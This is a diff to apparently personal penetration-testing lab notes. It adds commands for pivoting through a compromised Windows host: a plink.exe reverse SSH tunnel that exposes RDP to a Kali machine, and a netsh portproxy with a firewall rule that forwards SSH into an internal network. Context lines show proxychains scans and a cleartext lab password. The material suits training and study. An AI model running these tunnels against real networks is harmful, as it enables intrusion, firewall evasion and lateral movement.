@@ -131,7 +131,14 @@ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234    
 proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217                          \\\\ Nmap request with "proxychain"
 ```
 #### SSH Remote Port Forwarding
+> **netsh** is a tool that manages Firewalls (It might need some administrator privileges to be ran.)
 ```
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4                        \\\\ "Bind shell" like port forwarding
 psql -h 127.0.0.1 -p 2345 -U postgres
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+netsh interface portproxy show all
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
 ```
